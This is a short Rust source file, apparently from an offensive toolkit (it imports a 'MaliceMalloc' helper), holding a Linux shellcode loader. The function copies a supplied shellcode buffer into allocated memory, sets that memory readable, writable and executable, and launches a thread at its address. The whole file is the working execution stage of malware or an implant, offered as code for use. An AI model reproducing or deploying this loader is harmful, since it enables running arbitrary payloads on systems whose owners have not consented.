use crate::common::memory::MaliceMalloc;
use libc::{pthread_create, pthread_join};
use std::sync::{Arc, Mutex};
use std::time::Duration;
use std::os::raw::c_void;

#[cfg(target_os = "linux")]
pub fn loader(shellcode : Vec<u8>) {
    let mut size = shellcode.len();
    if size < 0 {
        return;
    }
    
    let mut m_memory = MaliceMalloc::new(size);
    if m_memory.is_err() {
        return;
    }
    let m_memory = m_memory.unwrap();

     unsafe {
        libc::memcpy(m_memory.get_ptr() , shellcode.as_ptr() as *const libc::c_void, m_memory.get_size());
    }
    // sleep 10秒
    // sleep(Duration::from_secs(10));
    
    m_memory.set_protect((libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC) as _);
    println!("will pthread create!");

    unsafe {
        let mut pthread_handle : libc::pthread_t = std::mem::zeroed();
        pthread_create(&mut pthread_handle, 
                             std::ptr::null(), 
                             std::mem::transmute(m_memory.get_ptr()),
                             std::ptr::null_mut());
    }

    std::thread::sleep(Duration::from_secs(2));

}